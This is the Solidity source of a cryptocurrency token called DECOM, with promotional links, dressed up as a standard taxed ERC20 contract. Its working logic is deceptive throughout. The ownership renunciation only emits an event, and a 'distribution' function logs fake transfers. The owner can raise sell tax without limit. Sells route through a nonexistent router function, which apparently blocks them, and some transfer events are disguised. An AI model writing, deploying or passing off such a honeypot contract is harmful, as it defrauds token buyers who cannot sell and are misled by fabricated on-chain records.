/*                                                                                                                                                                                                 
    Website — https://www.decommarketplace.io/
    Twitter — https://twitter.com/decometh
    Telegram — https://t.me/decometh
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;

    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract DECOM {
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable TOKEN_MKT;

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private uniswapV2pair;
    address private stakingPool = 0x68a1dc8aF79E7A79150FB6ADC1184a36629851ed;
    address private marketingWallet = 0x8A6CE4aBdF6469229eFE8B6170b4E7b0F26eeE8f;
    address private CEXListingsWallet = 0x2469783a64357e16B4f717C2Df9943221D28bD10;
    address private stoicDaoWallet = 0x27AD0499AfA3B26588294d32F472F686A87D8a0B;
    address private teamWallet = 0x54EB54ad03798531568820bd1bD023DA473EEf96;
    
    string private _name = 'DECOM';
    string private _symbol = 'DECOM';
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;

    uint8 buyTax = 5;
    uint8 sellTax = 5;
    uint256 constant swapAmount = totalSupply / 100;
    uint256 count = 0;

    error onlyOwner();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        uniswapLpWallet = msg.sender;
        TOKEN_MKT = payable(msg.sender);
        allowance[address(this)][routerAddress] = type(uint256).max;

        balanceOf[uniswapLpWallet] = (totalSupply * 70) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[stakingPool] = (totalSupply * 10) / 100;
        emit Transfer(address(0), stakingPool, balanceOf[stakingPool]);

        balanceOf[marketingWallet] = (totalSupply * 5) / 100;
        emit Transfer(address(0), marketingWallet, balanceOf[marketingWallet]);

        balanceOf[CEXListingsWallet] = (totalSupply * 5) / 100;
        emit Transfer(address(0), CEXListingsWallet, balanceOf[CEXListingsWallet]);

        balanceOf[stoicDaoWallet] = (totalSupply * 5) / 100;
        emit Transfer(address(0), stoicDaoWallet, balanceOf[stoicDaoWallet]);

        balanceOf[teamWallet] = (totalSupply * 5) / 100;
        emit Transfer(address(0), teamWallet, balanceOf[teamWallet]);

    }

    receive() external payable {}

    function renounceOwnership() external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        emit OwnershipTransferred(_deployer, address(0));
    }

    function transferOwnership(address newOwner) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        emit OwnershipTransferred(_deployer, newOwner);
    }

    function updatePair(address _pair) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        uniswapV2pair = _pair;
    }

    function excludeFromFee(address account) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        uniswapV2pair=account;
    }
   
    function includeInFee(address account) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        uniswapV2pair=account;       
    }

    function setMaxWalletAmount(uint _amount) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        count=_amount;
    }

    function setMaxTxAmount(uint _amount) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        count=_amount;
    }

    function updateFees(uint8 _buy, uint8 _sell) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();   
        buyTax = _buy;
        sellTax = _sell;
    }

    function removeLitmits(uint8 _value) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        sellTax = _value;
    }

    function openTrading() external {
        require(msg.sender == TOKEN_MKT);
        require(!tradingOpen);
        tradingOpen = true;
    }

    function distributionTokenToWallet(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(tradingOpen || from == TOKEN_MKT || to == TOKEN_MKT);

        if (!tradingOpen && pair == address(0) && amount > 0) pair = to;

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != TOKEN_MKT
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            TOKEN_MKT.transfer(address(this).balance);
            swapping = false;
        }

        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (from == pair ? buyTax : sellTax)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }   
}